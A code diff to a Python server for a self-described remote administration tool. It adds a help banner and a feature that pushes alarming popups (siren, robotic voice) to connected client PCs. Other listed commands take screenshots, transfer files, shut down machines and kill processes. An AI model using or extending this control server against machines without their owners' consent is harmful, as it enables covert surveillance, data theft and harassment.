@@ -1,5 +1,6 @@
 import socket
 import os
+import sys
 import json
 import base64
 import threading
@@ -7,6 +8,66 @@ import time
 import logging
 from datetime import datetime
 from typing import Dict, Optional, Tuple
+
+# --- Handle --help flag before anything else ---
+if "--help" in sys.argv or "-h" in sys.argv:
+    print("""
++==============================================================================+
+|       REMOTE ADMINISTRATION TOOL - Server Help (Enterprise v3.0)            |
++==============================================================================+
+
+ USAGE:
+   python server.py              -> Start server normally
+   python server.py --help       -> Show this help message
+
+ ------------------------------------------------------------------------------
+ QUICK COMMANDS (type number or full command):
+   [1] / ipconfig       -> Network configuration of client
+   [2] / whoami         -> Current logged-in user
+   [3] / dir            -> List files in current directory
+   [4] / systeminfo     -> Full system information
+   [5] / tasklist       -> List all running processes
+   [6] / cd             -> Show current directory path
+
+ ------------------------------------------------------------------------------
+ ADVANCED FEATURES:
+   screenshot           -> Capture client screen (saves as .png)
+   download <path>      -> Download a file from client PC
+   upload               -> Upload a file to client PC
+   sysinfo              -> Get detailed JSON system information
+
+ ------------------------------------------------------------------------------
+ MESSAGING:
+   popup                -> Send a popup alert to client screen
+                           (Cyberpunk UI + Ambulance siren + Robotic voice)
+
+ ------------------------------------------------------------------------------
+ SYSTEM CONTROL (dangerous - use with care!):
+   restart              -> Restart the client PC
+   shutdown             -> Shutdown the client PC
+   lock                 -> Lock the client workstation screen
+
+ ------------------------------------------------------------------------------
+ PROCESS CONTROL:
+   find <name>          -> Find a running process by name
+   kill <name>          -> Kill a process by name (e.g., kill notepad.exe)
+
+ ------------------------------------------------------------------------------
+ CLIENT MANAGEMENT:
+   clients              -> List all connected clients
+   switch               -> Switch to a different client
+   info                 -> Show current active client info
+   shutdown_client      -> Force terminate the client .exe process
+
+ ------------------------------------------------------------------------------
+ NAVIGATION:
+   menu                 -> Show quick command menu
+   exit                 -> Disconnect current client
+   Ctrl+C               -> Stop the server
+
++==============================================================================+
+""")
+    sys.exit(0)
 
 # Configuration
 HOST = "0.0.0.0"
@@ -71,6 +132,9 @@ def print_menu():
     print("  [shutdown_client] - Terminate client process completely")
     print("")
     print("  [menu] - Show this menu  |  [exit] - Disconnect current client")
+    print("")
+    print("MESSAGING:")
+    print("  [popup]      - Send a popup message to client screen")
     print("-"*80 + "\n")
 
 def list_clients():
@@ -353,6 +417,49 @@ def upload_file():
         print(f"❌ Error: {str(e)}\n")
         logging.error(f"Upload error: {e}")
 
+def send_popup():
+    """Send a popup message box to the client's screen"""
+    if not active_client_id:
+        print("⚠️  No active client\n")
+        return
+    
+    title = input("Popup Title (e.g., Warning): ").strip()
+    if not title:
+        print("❌ Title cannot be empty\n")
+        return
+    
+    message = input("Popup Message: ").strip()
+    if not message:
+        print("❌ Message cannot be empty\n")
+        return
+    
+    try:
+        with clients_lock:
+            if active_client_id not in clients:
+                print("⚠️  Client disconnected\n")
+                return
+            conn = clients[active_client_id]["conn"]
+            hostname = clients[active_client_id].get("info", {}).get("hostname", "Unknown")
+        
+        cmd = f"POPUP:{title}:{message}"
+        conn.send(cmd.encode())
+        
+        conn.settimeout(5.0)
+        try:
+            data = conn.recv(4096)
+            response = json.loads(data.decode())
+            if response.get("status") == "success":
+                print(f"✓ Popup sent to {hostname} successfully!\n")
+                logging.info(f"Popup sent to {hostname}: [{title}] {message}")
+            else:
+                print(f"❌ Failed: {response.get('message')}\n")
+        except socket.timeout:
+            print("⚠️  No response from client (popup may still have shown)\n")
+    except Exception as e:
+        print(f"❌ Error sending popup: {str(e)}\n")
+        logging.error(f"Popup send error: {e}")
+
+
 def accept_clients():
     """Accept multiple clients with enhanced error handling and validation"""
     global server_running
@@ -531,6 +638,9 @@ while True:
                     print(f"{'='*80}\n")
                 else:
                     print("⚠️  Client disconnected\n")
+            continue
+        elif cmd == "popup":
+            send_popup()
             continue
         elif cmd == "sysinfo":
             cmd = "SYSINFO"
